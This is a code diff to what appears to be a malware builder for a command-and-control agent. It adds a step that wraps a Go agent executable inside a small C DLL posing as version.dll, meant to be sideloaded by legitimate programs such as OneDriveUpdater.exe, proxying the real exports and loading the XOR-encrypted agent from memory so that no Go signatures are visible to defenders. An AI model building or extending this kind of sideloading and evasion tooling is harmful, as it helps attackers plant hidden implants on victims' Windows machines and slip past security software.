@@ -29,6 +29,7 @@ import { cleanupMacosSdkUpload, extractAndValidateMacosSdk } from "./macos-sdk-m
 import { getActiveTlsSpkiPins } from "./tls-bootstrap";
 import { installProviderArtifacts, providerStagingDirectory } from "./plugin-build-provider";
 import type { PluginBuildProviderOutput } from "./plugin-runtime/runtime";
+import { buildCDllStub } from "./c-dll-builder";
 
 export function createAgentTlsPinsLdflag(pins: string[]): string {
   if (pins.length === 0) return "";
@@ -1984,6 +1985,8 @@ func binderExec(outPath string, _ []byte) {
         // environment-isolation contract.
         baseTags = enforceBuilderReleaseTag(baseTags);
 
+        // isDllBuild with sideloadDllName = C stub path (Go built as EXE, embedded in C DLL)
+        // isDllBuild without sideloadDllName = pure Go -buildmode=c-shared (fallback)
         const isDllBuild = effectiveOs === "windows" && winExt === ".dll";
         const SIDELOAD_DLL_MAP: Record<string, string> = {
           "OneDriveUpdater.exe": "version.dll",
@@ -1997,10 +2000,13 @@ func binderExec(outPath string, _ []byte) {
           ? SIDELOAD_DLL_MAP[config.sideloadTarget] ?? null
           : null;
         const runBuild = async (tags: string[], outputPath: string) => {
-          const allTags = isDllBuild ? [...tags, "dll_sideload"] : tags;
+          // C stub path: Go built as normal EXE, embedded inside C DLL
+          // Pure Go DLL path (no sideloadTarget): -buildmode=c-shared
+          const useGoDll = isDllBuild && !sideloadDllName;
+          const allTags = useGoDll ? [...tags, "dll_sideload"] : tags;
           const effectiveTags = enforceBuilderReleaseTag(allTags);
           const buildArgs: string[] = [];
-          if (isDllBuild) buildArgs.push("-buildmode=c-shared");
+          if (useGoDll) buildArgs.push("-buildmode=c-shared");
           if (effectiveTags.length > 0) buildArgs.push("-tags", effectiveTags.join(" "));
           buildArgs.push("-trimpath", "-buildvcs=false");
           if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
@@ -2108,6 +2114,29 @@ func binderExec(outPath string, _ []byte) {
             sendToStream({ type: "output", text: `PE patched: ${rawPe.length} → ${patched.length} bytes\n`, level: "info" });
           } catch (patchErr: any) {
             sendToStream({ type: "output", text: `WARNING: PE patcher failed (non-fatal): ${patchErr.message || patchErr}\n`, level: "warn" });
+          }
+        }
+
+        // ── C DLL stub: wrap Go EXE in a clean C DLL with no Go signatures ──────
+        // When output is .dll and a sideloadTarget is set, we build a tiny C DLL
+        // that proxies the target's exports and loads the Go agent from memory.
+        // The Go agent is XOR-encrypted inside the C DLL — no Go fingerprints visible.
+        if (isDllBuild && sideloadDllName) {
+          const templatePath = path.join(clientDir, "dll-stub", "version_stub.c");
+          if (fs.existsSync(templatePath)) {
+            sendToStream({ type: "output", text: `Building C DLL stub (${sideloadDllName})...\n`, level: "info" });
+            const stubPath = filePath + ".stub.dll";
+            try {
+              await buildCDllStub(filePath, stubPath, templatePath, sendToStream);
+              fs.renameSync(stubPath, filePath);
+              finalSize = fs.statSync(filePath).size;
+              sendToStream({ type: "output", text: `C DLL stub ready: ${finalSize} bytes\n`, level: "success" });
+            } catch (stubErr: any) {
+              try { fs.unlinkSync(stubPath); } catch {}
+              sendToStream({ type: "output", text: `WARNING: C DLL stub failed (non-fatal): ${stubErr.message || stubErr}\n`, level: "warn" });
+            }
+          } else {
+            sendToStream({ type: "output", text: `WARNING: dll-stub/version_stub.c not found, skipping C stub\n`, level: "warn" });
           }
         }
 
